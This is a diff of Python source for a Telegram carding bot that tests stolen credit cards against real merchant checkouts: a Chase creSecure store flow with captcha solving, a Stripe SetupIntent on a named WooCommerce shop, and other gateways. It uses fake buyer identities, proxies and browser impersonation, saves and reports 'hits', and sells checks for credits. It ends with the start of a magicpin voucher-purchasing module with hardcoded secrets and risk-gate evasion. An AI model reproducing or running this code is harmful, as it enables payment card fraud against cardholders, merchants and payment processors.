+        return {"status": "ERROR", "response": "Bad card format"}
+    cc, mm, yy, cvv = d
+    year = yy[-2:] if len(yy) != 2 else yy
+    ctype = _chase_brand(cc)
+    if ctype == "UNKNOWN":
+        return {"status": "ERROR", "response": "Amex/other BIN not supported"}
+    first = random.choice(["James", "Michael", "David", "Robert", "Daniel", "Chris"])
+    last = random.choice(["Smith", "Johnson", "Brown", "Miller", "Wilson", "Davis"])
+    name = f"{first} {last}"
+    email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@gmail.com"
+    phone = f"201{random.randint(2000000, 9999999)}"
+    addr = f"{random.randint(100, 9999)} Main St"
+    city, state, zipc = "New York", "NY", f"100{random.randint(10, 99)}"
+
+    proxy_url = None
+    if proxy:
+        try:
+            proxy_url = format_proxy_stco(proxy) or proxy
+        except Exception:
+            proxy_url = proxy
+
+    s = requests.Session()
+    s.headers.update({"user-agent": CHASE_UA})
+    if proxy_url:
+        s.proxies.update({"http": proxy_url, "https": proxy_url})
+    H = {"User-Agent": CHASE_UA,
+         "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
+                    "image/avif,image/webp,*/*;q=0.8"),
+         "accept-language": "en-US,en;q=0.9"}
+
+    def vget(url, **kw):
+        return s.get(url, headers=kw.pop("headers", H), verify=False, timeout=35, **kw)
+
+    def vpost(url, data=None, headers=None, **kw):
+        return s.post(url, data=data, headers=headers or H, verify=False,
+                      timeout=35, **kw)
+
+    try:
+        ipz = s.get("https://ipinfo.io/json", timeout=15).json().get("ip")
+        if not ipz:
+            return {"status": "ERROR", "response": "Egress IP lookup failed (proxy dead?)"}
+
+        # 1) product page -> viewstate
+        rq1 = vget(CHASE_ITEM_URL)
+        vs = _chase_between(rq1.text, 'id="__VIEWSTATE" value="', '"')
+        ev = _chase_between(rq1.text, 'id="__EVENTVALIDATION" value="', '"')
+        vg = _chase_between(rq1.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
+        if not vs or not ev or not vg:
+            return {"status": "ERROR", "response": "Store product page failed (retry)"}
+
+        # 2) add to cart
+        vpost(CHASE_ITEM_URL, data={
+            "__VIEWSTATE": vs, "__VIEWSTATEGENERATOR": vg,
+            "__SCROLLPOSITIONX": "0", "__SCROLLPOSITIONY": "300.5",
+            "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__EVENTVALIDATION": ev,
+            "ctl00$UserNameTextBox": "", "ctl00$PasswordTextBox": "",
+            "ctl00$Store_content$AddToCartQuantityTextBox": "1",
+            "ctl00$Store_content$AddToCartButton": "Add To Cart",
+            "ctl00$Store_content$LastTab": ""},
+            headers={**H, "origin": CHASE_STORE, "referer": CHASE_ITEM_URL})
+
+        # 3) checkout information page -> viewstate
+        rq2 = vget(f"{CHASE_STORE}/store/information",
+                   headers={**H, "referer": f"{CHASE_STORE}/store/CheckoutAccount"})
+        vs2 = _chase_between(rq2.text, 'id="__VIEWSTATE" value="', '"')
+        ev2 = _chase_between(rq2.text, 'id="__EVENTVALIDATION" value="', '"')
+        vg2 = _chase_between(rq2.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
+        if not vs2 or not ev2 or not vg2:
+            return {"status": "ERROR", "response": "Store checkout page failed (retry)"}
+
+        # 4) submit billing + proceed to payment
+        vpost(f"{CHASE_STORE}/store/information", data={
+            "__VIEWSTATE": vs2, "__VIEWSTATEGENERATOR": vg2,
+            "__SCROLLPOSITIONX": "0", "__SCROLLPOSITIONY": "1445.5",
+            "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__EVENTVALIDATION": ev2,
+            "ctl00$Store_content$BillingNameTextBox": name,
+            "ctl00$Store_content$BillingAddress1TextBox": addr,
+            "ctl00$Store_content$BillingAddress2TextBox": "",
+            "ctl00$Store_content$BillingCityTextBox": city,
+            "ctl00$Store_content$BillingStateTextBox": state,
+            "ctl00$Store_content$BillingStateListBox": state,
+            "ctl00$Store_content$BillingCountryListBox": "USA",
+            "ctl00$Store_content$BillingZipTextBox": zipc,
+            "ctl00$PhoneTextBox": phone,
+            "ctl00$Store_content$PhoneTextBox": phone,
+            "ctl00$Store_content$EMailTextBox": email,
+            "ctl00$Store_content$ShipToBillingAddressCheckBox": "on",
+            "ctl00$Store_content$PONumberTextBox": "",
+            "ctl00$Store_content$MemoBox": "",
+            "ShippingOptionsList": "SE UPS Ground",
+            "ctl00$Store_content$PaymentTypeRadioButtonList": "CC",
+            "ctl00$Store_content$PaymentButton": "Proceed to Payment"},
+            headers={**H, "origin": CHASE_STORE,
+                     "referer": f"{CHASE_STORE}/store/information"})
+
+        asp = rq1.cookies.get("ASP.NET_SessionId") or s.cookies.get("ASP.NET_SessionId")
+        if not asp:
+            return {"status": "ERROR", "response": "Store session id missing (retry)"}
+
+        # 5) creSecure init -> PHPSESSID
+        rq5 = vpost(CHASE_CRESECURE_INIT, data={
+            "session": asp, "sess_name": "", "trans_type": "auth_only",
+            "allowed_types": "Visa|MasterCard|Discover",
+            "total_amt": CHASE_TOTAL, "order_id": CHASE_ORDER_ID,
+            "order_desc": "", "customer_id": "WEBSITE", "ip_address": ipz,
+            "shipping_method": "SE UPS Ground", "tax": "0.00",
+            "customer_company": name, "customer_address": addr,
+            "customer_address2": "", "customer_email": email,
+            "customer_phone": phone, "customer_city": city,
+            "customer_state": state, "customer_postal_code": zipc,
+            "customer_country": "USA", "delivery_company": name,
+            "delivery_address": addr, "delivery_address2": "",
+            "delivery_email": email, "delivery_phone": phone,
+            "delivery_city": city, "delivery_state": state,
+            "delivery_postal_code": zipc, "delivery_country": "USA",
+            "CRESecureID": CHASE_CRESECURE_ID, "currency_code": "USD",
+            "lang": "en US",
+            "return url": f"{CHASE_STORE}/store/confirmation",
+            "cancel url": f"{CHASE_STORE}/store/information",
+            "max_user_retries": "1"},
+            headers={**H, "origin": CHASE_STORE, "referer": CHASE_STORE + "/"})
+        php = rq5.cookies.get("PHPSESSID")
+        if not php:
+            return {"status": "ERROR", "response": "creSecure session missing (retry)"}
+
+        # 6) captcha page -> sitekey / action, then solve
+        page_url = f"{CHASE_CRESECURE_STORE}/securepayments/a1/cc_collection.php?sid={php}"
+        pg = vget(page_url, headers={**H, "referer": CHASE_STORE + "/"})
+        conf = re.search(r"mtcaptchaConfig\s*=\s*\{([^}]*)\}", pg.text or "")
+        conf_txt = conf.group(1) if conf else ""
+        skm = re.search(r"sitekey\s*[\"']?\s*:\s*[\"']([^\"']+)", conf_txt)
+        acm = re.search(r"action\s*[\"']?\s*:\s*[\"']([^\"']+)", conf_txt)
+        site_key = skm.group(1) if skm else "MTPublic-I0V7iwug2"
+        action = acm.group(1) if acm else CHASE_CRESECURE_ID
+        if "mtcaptcha" not in (pg.text or "").lower():
+            return {"status": "ERROR", "response": "creSecure captcha page not returned (retry)"}
+
+        token, cap_err = _chase_mtcaptcha(page_url, site_key, action)
+        if not token:
+            return {"status": "ERROR", "response": cap_err or "Captcha solve failed"}
+
+        # 7) submit card
+        t = int(datetime.now(timezone.utc).timestamp())
+        submit_url = (f"{CHASE_CRESECURE_STORE}/securepayments/a1/"
+                      "cc_collection.php")
+        kuro = vpost(submit_url,
+                     params={"sid": php, "action": "process", "t": t},
+                     data={"name": name, "card_type": ctype, "PAN": cc,
+                           "cresecure_cc_expires_month": mm.zfill(2),
+                           "cresecure_cc_expires_year": year,
+                           "cv_data": cvv,
+                           "mtcaptcha-verifiedtoken": token},
+                     headers={**H,
+                              "origin": CHASE_CRESECURE_STORE,
+                              "referer": page_url},
+                     allow_redirects=False)
+        loc = kuro.headers.get("location") or ""
+        code = avs = cvv_match = ""
+        if loc:
+            qs = parse_qs(urlparse(loc).query)
+            code = unquote(qs.get("code", [""])[0])
+            msg = unquote(qs.get("message", [""])[0])
+            avs = qs.get("AVSMatch", [""])[0]
+            cvv_match = qs.get("CVVMatch", [""])[0]
+        else:
+            msg = (_chase_between(kuro.text, '<span class="error_message">', '</span>')
+                   or _chase_between(kuro.text, '"error_message">', '<') or "")
+        msg = re.sub(r"\s+", " ", str(msg or "")).strip()
+
+        extra = ""
+        if avs or cvv_match:
+            extra = f" (AVS {avs or '-'} / CVV {cvv_match or '-'})"
+        if msg.lower() == "success":
+            return {"status": "CHARGED", "response": "Payment Successful" + extra}
+        low = msg.lower()
+        if any(h in low for h in _CHASE_LIVE_HINTS):
+            return {"status": "INSUFFICIENT_FUNDS",
+                    "response": (msg or "Card live") + extra}
+        if "declined" in low or code:
+            return {"status": "DECLINED",
+                    "response": (msg or "Card Declined") + (f" [{code}]" if code else "")}
+        return {"status": "ERROR",
+                "response": (msg or f"Unknown gateway response (http {kuro.status_code})")[:110]}
+    except Exception as e:
+        return {"status": "ERROR", "response": f"Request failed: {str(e)[:80]}"}
+
+
+def _chase_between(text, before, after):
+    try:
+        i = text.index(before) + len(before)
+        return text[i:text.index(after, i)].strip()
+    except Exception:
+        return None
+
+
+async def _ext_chase_check(card: str, proxy: str = None) -> dict:
+    return await asyncio.to_thread(_chase_check_sync, card, proxy)
+
+
+# ── Stripe Auth 0$ (WooCommerce SetupIntent, dilaboards.com) ─────────
+SAUTH_SITE = "https://dilaboards.com"
+SAUTH_ADD_URL = f"{SAUTH_SITE}/my-account/add-payment-method/"
+SAUTH_FALLBACK_PK = "pk_live_51O4kxvIxTTJe9HnfnAjoLynarCA1KTuhpMXLNkJP37GRy48KOpG1MeyWVudrLspRNXM9IOWXKLbEQequZTUfmcCo003taYwkgR"
+
+
+async def _ext_sauth_check(card: str, proxy: str = None) -> dict:
+    """0$ card verification: payment_method -> WooCommerce SetupIntent."""
+    d = _ext_card_parts(card)
+    if not d:
+        return {"status": "ERROR", "response": "Bad card format"}
+    cc, mm, yy, cvv = d
+    yy4 = yy if len(yy) == 4 else "20" + yy
+    try:
+        c = await stco_tls.get_client(proxy)
+        ua = EXT_UA_ANDROID
+
+        r = await c.get(SAUTH_ADD_URL, headers={
+            "user-agent": ua,
+            "accept": "text/html,application/xhtml+xml,*/*;q=0.8"})
+        page = r.text or ""
+
+        nm = (re.search(r'createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', page)
+              or re.search(r'add_card_nonce"\s*:\s*"([^"]+)"', page)
+              or re.search(r'name="add_payment_method_nonce"\s+value="([^"]+)"', page)
+              or re.search(r'wc_stripe_add_payment_method_nonce"\s*:\s*"([^"]+)"', page))
+        nonce = nm.group(1) if nm else ""
+        km = re.search(r'pk_live_[A-Za-z0-9]{20,}', page)
+        pk = km.group(0) if km else SAUTH_FALLBACK_PK
+        if not nonce:
+            return {"status": "ERROR", "response": "Add-card nonce not found (site changed?)"}
+
+        pm = await c.post(
+            "https://api.stripe.com/v1/payment_methods",
+            data={
+                "type": "card",
+                "card[number]": cc, "card[cvc]": cvv,
+                "card[exp_month]": mm, "card[exp_year]": yy4,
+                "allow_redisplay": "unspecified",
+                "billing_details[address][country]": "US",
+                "payment_user_agent": "stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent",
+                "referrer": SAUTH_SITE,
+                "guid": uuid.uuid4().hex, "muid": uuid.uuid4().hex, "sid": uuid.uuid4().hex,
+                "key": pk,
+                "_stripe_version": "2024-06-20",
+            },
+            headers={"accept": "application/json",
+                     "content-type": "application/x-www-form-urlencoded",
+                     "origin": "https://js.stripe.com",
+                     "referer": "https://js.stripe.com/",
+                     "user-agent": ua})
+        try:
+            pj = pm.json()
+        except Exception:
+            pj = {}
+        if isinstance(pj, dict) and pj.get("error"):
+            msg = str((pj["error"] or {}).get("message") or "Card rejected")[:90]
+            return {"status": "DECLINED", "response": msg}
+        pm_id = (pj or {}).get("id")
+        if not pm_id:
+            return {"status": "ERROR", "response": "Payment method not created"}
+
+        conf = await c.post(
+            f"{SAUTH_SITE}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
+            data={"wc-stripe-payment-method": pm_id,
+                  "_ajax_nonce": nonce,
+                  "wc-stripe-payment-type": "card"},
+            headers={"accept": "application/json, text/javascript, */*; q=0.01",
+                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "origin": SAUTH_SITE,
+                     "referer": SAUTH_ADD_URL,
+                     "x-requested-with": "XMLHttpRequest",
+                     "user-agent": ua})
+        text = conf.text or ""
+        print(f"📥 [SAUTH] confirm HTTP {conf.status_code} len={len(text)}")
+        try:
+            js = conf.json()
+        except Exception:
+            js = {}
+
+        if isinstance(js, dict) and js.get("success"):
+            data = js.get("data") or {}
+            st = str(data.get("status") or "")
+            if st == "succeeded":
+                return {"status": "CHARGED", "response": "Payment Method Added"}
+            if st == "requires_action":
+                return {"status": "DECLINED", "response": "3DS Required"}
+            return {"status": "CHARGED", "response": f"Approved ({st or 'ok'})"}
+
+        if isinstance(js, dict):
+            err = (js.get("data") or {}).get("error") or {}
+            msg = str(err.get("message") or "").strip()
+            if msg:
+                if "insufficient" in msg.lower():
+                    return {"status": "INSUFFICIENT_FUNDS", "response": "INSUFFICIENT_FUNDS"}
+                return {"status": "DECLINED", "response": msg[:90]}
+
+        low = text.lower()
+        if "requires_action" in low or "3d" in low:
+            return {"status": "DECLINED", "response": "3DS Required"}
+        if "succeeded" in low:
+            return {"status": "CHARGED", "response": "Payment Method Added"}
+        return {"status": "DECLINED", "response": (text[:80] or "Declined")}
+    except Exception as e:
+        return {"status": "ERROR", "response": f"Request failed: {str(e)[:80]}"}
+
+
+EXT_CHECKERS = {
+    "pway": _ext_payway_check,
+    "anet": _ext_anet_check,
+    "chase": _ext_chase_check,
+    "sauth": _ext_sauth_check,
+}
+
+
+def ext_format_result(label: str, card: str, bin_info: tuple,
+                      status: str, response: str, price: str = None) -> str:
+    info = list(bin_info or []) + ["N/A", "Unknown", "Unknown", "USD", "XX"]
+    bin_text, bank, country = info[0], info[1], info[2]
+    status = (status or "").upper()
+
+    if status == "CHARGED":
+        icon = premium_emoji("5902002809573740949", "✅")
+    elif status == "INSUFFICIENT_FUNDS":
+        icon = premium_emoji(PREMIUM_EMOJI_IDS.get("money", "5438548621127615575"), "💰")
+    elif status == "DECLINED":
+        icon = premium_emoji(PREMIUM_EMOJI_IDS.get("declined", "6267039884016358504"), "❌")
+    else:
+        icon = premium_emoji(PREMIUM_EMOJI_IDS.get("error", "6282641460093260838"), "⚠️")
+
+    clean = re.sub(r"<[^>]+>", "", str(response or ""))[:110] or "Unknown"
+    bank_d = bank if isinstance(bank, str) and bank and bank != "N/A" else "Unknown"
+    if len(bank_d) > 30:
+        bank_d = bank_d[:27] + "..."
+    return (
+        f"<b>{label}</b> {_UI_SPARKLE}\n\n"
+        f"{_UI_STAR} 𝗖𝗔𝗥𝗗 ↣ <code>{card}</code>\n\n"
+        f"{icon} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ↣ <code>{clean}</code>\n"
+        f"{_UI_COIN} 𝗣𝗿𝗶𝗰𝗲 ↣ <b>{price or EXT_PRICE_LABEL}</b>\n\n"
+        f"{_UI_GLOBE} 𝗕𝗜𝗡 ↣ <b>{bin_text}</b>\n"
+        f"{_UI_ROCKET} 𝗕𝗮𝗻𝗸 ↣ <b>{bank_d}</b>\n"
+        f"{_UI_BIN} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↣ <b>{str(country or 'Unknown')}</b>"
+    )
+
+
+async def ext_single_run(update, context, key: str):
+    g = EXT_GATEWAYS[key]
+    label = g["label"]
+    price = g.get("price", EXT_PRICE_LABEL)
+    u_id = update.effective_user.id
+    message = update.effective_message
+
+    cards = await _cc_collect_cards(update, context)
+    if not cards:
+        _mass_line = (f"\nMass: <code>/{g['mcmd']} &lt;cards…&gt;</code>"
+                      if g.get("mcmd") else "")
+        await message.reply_text(
+            f"<b>{label}</b>\n\nUsage: <code>/{g['cmd']} &lt;card&gt;</code>{_mass_line}",
+            parse_mode=ParseMode.HTML)
+        return
+    if len(cards) > 1:
+        if g.get("mass", True):
+            await ext_mass_run(update, context, cards, key)
+            return
+        cards = cards[:1]          # single-only gateway (Chase)
+
+    if not await require_gateway_access(u_id, key, message):
+        return
+    ok, err = await check_and_deduct_credits(u_id, update, context,
+                                             is_mass_check=False, card_count=1)
+    if not ok:
+        await message.reply_text(err, parse_mode=ParseMode.HTML)
+        return
+
+    card = cards[0]
+    smsg = await message.reply_text(
+        build_single_check_checking(label, card, price=price),
+        parse_mode=ParseMode.HTML)
+    try:
+        res = await ext_run_check(key, card, _ext_proxy_list(u_id), u_id)
+        bin_info = await get_bin_info(card)
+        ui = ext_format_result(label, card, bin_info, res.get("status"), res.get("response"), price)
+        try:
+            await smsg.edit_text(ui, parse_mode=ParseMode.HTML)
+        except Exception:
+            await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if res.get("status") == "CHARGED":
+            await save_hit_to_file(card=card, gateway=label,
+                                   response=res.get("response", ""), price=price,
+                                   bin_info=bin_info, user_id=u_id,
+                                   user_tier=user_manager.get_tier(u_id))
+            await send_hit_notification(
+                context=context, gateway=label, card=card,
+                response=res.get("response", ""), price=price,
+                user=user_manager.get_user(u_id), bin_info=bin_info,
+                status_category="charged")
+            user_manager.increment_hits(u_id)
+        user_manager.increment_checks(u_id)
+    except Exception as e:
+        try:
+            await smsg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except Exception:
+            pass
+
+
+async def ext_mass_run(update, context, cards: list, key: str):
+    g = EXT_GATEWAYS[key]
+    label, mcmd = g["label"], g["mcmd"]
+    price = g.get("price", EXT_PRICE_LABEL)
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+
+    if u_id in ext_active_tasks:
+        await message.reply_text("⚠️ Already running an external-gateway session. Use /stop.")
+        return
+
+    if not await require_gateway_access(u_id, key, message):
+        return
+    ok, err = await check_and_deduct_mass_credits(u_id, update, context, total)
+    if not ok:
+        await message.reply_text(err, parse_mode=ParseMode.HTML)
+        return
+
+    session_id = create_session(u_id, label, total)
+    mc_init_session_cards(session_id)
+    stats = {"charged": 0, "approved": 0, "declined": 0, "errors": 0,
+             "processed": 0, "total": total}
+    start_time = time.time()
+    proxy = _ext_proxy(u_id)
+    sem = asyncio.Semaphore(3)
+    lock = asyncio.Lock()
+    processed = [0]
+
+    progress_msg = await message.reply_text(
+        f"<b>{label}</b>\n<b>Status</b> ➛ STARTING...\n<b>Checked</b> ➛ 0/{total}",
+        parse_mode=ParseMode.HTML,
+        reply_markup=build_mass_check_keyboard(stats, u_id, session_id, mcmd))
+
+    async def bump():
+        try:
+            await progress_msg.edit_text(
+                f"<b>{label}</b>\n"
+                f"<b>Status</b> ➛ {processed[0]}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} 🔥\n"
+                f"<b>Dead</b> ➛ {stats['declined']} ❌\n"
+                f"<b>Errors</b> ➛ {stats['errors']} ⚠️",
+                parse_mode=ParseMode.HTML,
+                reply_markup=build_mass_check_keyboard(
+                    stats, u_id, session_id, mcmd,
+                    finished=(processed[0] >= total)))
+        except Exception:
+            pass
+
+    async def one(card):
+        async with sem:
+            if u_id not in ext_active_tasks:
+                return
+            res = await ext_run_check(key, card, proxy)
+            st = (res.get("status") or "ERROR").upper()
+            async with lock:
+                processed[0] += 1
+                if st == "CHARGED":
+                    stats["charged"] += 1
+                    mc_track(session_id, "charged", card)
+                elif st == "INSUFFICIENT_FUNDS":
+                    stats["approved"] += 1
+                    mc_track(session_id, "live", card)
+                elif st == "DECLINED":
+                    stats["declined"] += 1
+                    mc_track(session_id, "dead", card)
+                else:
+                    stats["errors"] += 1
+                    mc_track(session_id, "dead", card)
+                if processed[0] % 3 == 0 or processed[0] >= total:
+                    await bump()
+            if st in ("CHARGED", "INSUFFICIENT_FUNDS"):
+                bin_info = await get_bin_info(card)
+                try:
+                    await message.reply_text(
+                        ext_format_result(label, card, bin_info, st, res.get("response"), price),
+                        parse_mode=ParseMode.HTML)
+                except Exception:
+                    pass
+                await save_hit_to_file(card=card, gateway=label,
+                                       response=res.get("response", ""),
+                                       price=price, bin_info=bin_info,
+                                       user_id=u_id,
+                                       user_tier=user_manager.get_tier(u_id))
+                if st == "CHARGED":
+                    await send_hit_notification(
+                        context=context, gateway=label, card=card,
+                        response=res.get("response", ""), price=price,
+                        user=user_manager.get_user(u_id), bin_info=bin_info,
+                        status_category="charged")
+                    user_manager.increment_hits(u_id)
+            user_manager.increment_checks(u_id)
+
+    try:
+        ext_active_tasks[u_id] = True
+        results = await asyncio.gather(*[asyncio.create_task(one(c)) for c in cards],
+                                       return_exceptions=True)
+        for r in results:
+            if isinstance(r, Exception):
+                print(f"⚠️ [EXT] task error: {r}")
+        await bump()
+    except Exception as e:
+        print(f"❌ [EXT] mass run error: {e}")
+    finally:
+        ext_active_tasks.pop(u_id, None)
+
+
+async def ext_single_cmd(update, context):
+    cmd = (update.effective_message.text or "").split()[0].split("@")[0].lstrip("/").lower()
+    try:
+        mk = (update.effective_message.chat_id, update.effective_message.message_id)
+        if mk in _EXT_SEEN:
+            return
+        _EXT_SEEN.add(mk)
+        if len(_EXT_SEEN) > 500:
+            _EXT_SEEN.clear()
+    except Exception:
+        pass
+    key = EXT_BY_CMD.get(cmd)
+    if not key:
+        return
+    try:
+        await ext_single_run(update, context, key)
+    except Exception as e:
+        print(f"❌ [EXT] single handler error: {e}")
+        try:
+            await update.effective_message.reply_text(
+                f"❌ <b>Error</b>\n<code>{str(e)[:120]}</code>",
+                parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
+
+
+async def ext_mass_cmd(update, context):
+    cmd = (update.effective_message.text or "").split()[0].split("@")[0].lstrip("/").lower()
+    cmd = EXT_BY_MCMD_ALIASES.get(cmd, cmd)
+    key = EXT_BY_MCMD.get(cmd)
+    if not key or not EXT_GATEWAYS[key].get("mass", True):
+        return
+    try:
+        cards = await _cc_collect_cards(update, context)
+    except Exception as e:
+        print(f"❌ [EXT] mass collect error: {e}")
+        return
+    if not cards:
+        await update.effective_message.reply_text(
+            f"Usage: <code>/{EXT_GATEWAYS[key]['mcmd']} &lt;card1&gt; &lt;card2&gt; …</code>",
+            parse_mode=ParseMode.HTML)
+        return
+    await ext_mass_run(update, context, cards, key)
+
+
+# ══════════════════════════════════════════════════════════════════════
+#  MAGICPIN  —  manual OTP login  (Phase 2)  +  voucher purchase  (Phase 3)
+#
+#  Ported from autohitters/mpin.py. Manual OTP: the user types the code in
+#  chat, we keep the pending login (phone + live client) in context.user_data
+#  with a 5-minute TTL, then persist the authenticated magicpin session to a
+#  per-user JSON keyed by telegram user_id so /mpc can reuse it.
+# ══════════════════════════════════════════════════════════════════════
+
+MPIN_SESSIONS_FILE = "mpin_sessions.json"
+MPIN_OTP_TTL = 300                 # 5 minutes for the manual OTP step
+MPIN_AUTH_SECRET = "kQLMCQBrfevxhzuPpFWT"
+MPIN_APP_VERSION = "5001"
+MPIN_CAPTCHA_KEY = "6Ld16sUhAAAAAFvZrLRlgs1FMOK-NDAgMyeXTZai"
+MPIN_CONFIG_TTL = 43200            # re-scrape magicpin config every 12 h
+MPIN_HOST = "https://magicpin.in"
+MPIN_API = "https://webapi.magicpin.in"
+MPIN_PG = "https://pg.magicpin.com"
+
+MPIN_BRANDS = {
+    "mpl":  {"label": "Google Play",  "name": "Google Play Recharge", "merchant_id": 26759740,
+             "url": "https://magicpin.in/Google-Play-Recharge-offers/308568/", "amount": 50.0},
+    "mpl25": {"label": "Google Play 25", "name": "Google Play Recharge", "merchant_id": 26759740,
+             "url": "https://magicpin.in/Google-Play-Recharge-offers/308568/", "amount": 25.0},
+    "mzm":  {"label": "Zomato",       "name": "Zomato",       "merchant_id": 4924499,
+             "url": "https://magicpin.in/profilemerchant?userId=4924499&tabType=store_visit", "amount": 500.0},
+    "mbl":  {"label": "Blinkit",      "name": "Blinkit",      "merchant_id": 4376387,
+             "url": "https://magicpin.in/profilemerchant?userId=4376387&tabType=store_visit", "amount": 500.0},
+    "mbl1": {"label": "Blinkit 1K",   "name": "Blinkit",      "merchant_id": 4376387,
+             "url": "https://magicpin.in/profilemerchant?userId=4376387&tabType=store_visit", "amount": 1000.0},
+}
+MPIN_DEFAULT_BRAND = "mpl"
+_MPIN_SESS_LOCK = threading.Lock()
+
+try:                       # Chrome TLS impersonation for the pg.magicpin.com leg
+    from curl_cffi import requests as _mpin_cffi
+except Exception:
+    _mpin_cffi = None
+
+# magicpin's risk gate rejects a purchase before the card is even submitted,
+# so "suspicious" on every card usually means IP / account level blocking.
+_MPIN_RISK_HINTS = ("suspicious", "suspected to be", "unusual activity", "flagged",
+                    "fraud", "risk", "blocked", "try again later")
+
+
+def _mpin_is_risk(res: dict) -> bool:
+    blob = f"{res.get('response') or ''} {res.get('code') or ''} {res.get('message') or ''}".lower()
+    return any(h in blob for h in _MPIN_RISK_HINTS)
+
+
+class _MpinCffiResp:
+    """Minimal httpx.Response-compatible wrapper around a curl_cffi response."""
+
+    def __init__(self, r):
+        self._r = r
+        self.status_code = r.status_code
+        self.text = r.text or ""
+        try:
+            self.headers = dict(r.headers)
+        except Exception:
+            self.headers = {}
+        self.url = str(getattr(r, "url", ""))
+
+    def json(self):
+        return self._r.json()
+
+
+
+def _mpin_sessions_load() -> dict:
+    try:
+        with open(MPIN_SESSIONS_FILE, "r", encoding="utf-8") as f:
+            d = json.load(f)
+        return d if isinstance(d, dict) else {}
+    except Exception:
+        return {}
+
+
+def _mpin_sessions_save(data: dict) -> bool:
+    try:
+        with _MPIN_SESS_LOCK:
+            tmp = MPIN_SESSIONS_FILE + ".tmp"
+            with open(tmp, "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=2)
+            try:
+                os.replace(tmp, MPIN_SESSIONS_FILE)
+            except Exception:
+                with open(MPIN_SESSIONS_FILE, "w", encoding="utf-8") as f:
+                    json.dump(data, f, indent=2)
+        return True
+    except Exception as e:
+        print(f"⚠️ [MPIN] session save failed: {e}")
+        return False
+
+
+def mpin_session_get(user_id) -> dict:
+    return _mpin_sessions_load().get(str(user_id)) or {}
+
+
+def mpin_session_put(user_id, data: dict) -> bool:
+    all_s = _mpin_sessions_load()
+    all_s[str(user_id)] = dict(data or {})
+    return _mpin_sessions_save(all_s)
+
+
+def mpin_session_del(user_id) -> bool:
+    all_s = _mpin_sessions_load()
+    if str(user_id) in all_s:
+        all_s.pop(str(user_id), None)
+        return _mpin_sessions_save(all_s)
+    return False
+
+
+def _mpin_norm_phone(raw: str) -> str:
+    d = re.sub(r"\D", "", str(raw or ""))
+    if len(d) == 12 and d.startswith("91"):
+        d = d[2:]
+    if len(d) == 11 and d.startswith("0"):
+        d = d[1:]
+    return d
+
+
+def _mpin_fp():
+    ver = random.choice(["131.0.6778.86", "130.0.6723.70", "129.0.6668.100", "128.0.6613.120"])
+    return {
+        "user-agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                       f"(KHTML, like Gecko) Chrome/{ver} Safari/537.36"),
+        "accept-language": random.choice(["en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+                                          "en-IN,en;q=0.9", "en-US,en;q=0.9,hi;q=0.8"]),
+        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+    }
+
+
+def _mpin_name():
+    return f"{random.choice(['Aarav', 'Vivaan', 'Aditya', 'Arjun', 'Rahul', 'Amit', 'Rohit', 'Vikram'])} " \
+           f"{random.choice(['Sharma', 'Verma', 'Patel', 'Gupta', 'Singh', 'Kumar', 'Nair', 'Iyer'])}"
+
+
+class MpinEngine:
+    """Magicpin web session: config scrape, reCAPTCHA mint, OTP, voucher + card pay."""
+
+    def __init__(self, proxy=None, sess: dict = None):
+        self.proxy = proxy if (proxy and isinstance(proxy, str) and proxy.startswith(("http", "socks"))) else None
+        self.phone = None
+        self.user_id = None
+        self.auth_token = None
+        self.user_w_id = None
+        self.user_name = "Magicpin User"
+        self.email = ""
+        self.city = "New Delhi"
+        self.locality = "Chandni Chowk"
+        self.lat = "28.6505942"
+        self.lon = "77.2303284"
+        self.auth_secret_key = MPIN_AUTH_SECRET
+        self.app_version = MPIN_APP_VERSION
+        self.captcha_site_key = MPIN_CAPTCHA_KEY
+        self.config_ts = 0
+        self._txn_baseline = None
+        self.last_pg_code = None
+        self.last_pg_message = ""
+        self.last_verify_card = {}
+        self.last_pay_raw = {}
+        self.client = self._new_client()
+        self.pg = self._new_pg()
+        if sess:
+            self.load_dict(sess)
+        try:                       # prime the pg edge session like the reference bot
+            if self.pg is not None:
+                self.pg.get(MPIN_PG + "/", timeout=10)
+        except Exception:
+            pass
+
+    # ── transport ───────────────────────────────────────────────────
+    def _new_client(self):
+        kw = {"follow_redirects": True, "timeout": 25.0}
+        if self.proxy:
+            kw["proxy"] = self.proxy
+        try:
+            return httpx.Client(http2=True, **kw)
+        except Exception:
+            pass
+        try:
+            return httpx.Client(**kw)
+        except TypeError:
+            kw.pop("proxy", None)
+            if self.proxy:
+                kw["proxies"] = {"http://": self.proxy, "https://": self.proxy}
+            return httpx.Client(**kw)
+
+    def _new_pg(self):
+        if _mpin_cffi is None:
+            return None
+        try:
+            kw = {"impersonate": random.choice(["chrome", "chrome110", "chrome124"])}
+            if self.proxy:
+                kw["proxies"] = {"http": self.proxy, "https": self.proxy}
+            return _mpin_cffi.Session(**kw)
+        except Exception:
+            return None
+
+    def pg_get(self, url, **kw):
+        kw.setdefault("timeout", 25)
+        if self.pg is not None:
+            try:
+                return _MpinCffiResp(self.pg.get(url, **kw))
+            except Exception:
+                pass
+        return self.client.get(url, **kw)
+
+    def pg_post(self, url, **kw):
+        kw.setdefault("timeout", 25)
+        if self.pg is not None:
+            try:
+                return _MpinCffiResp(self.pg.post(url, **kw))
+            except Exception:
+                pass
+        return self.client.post(url, **kw)
+
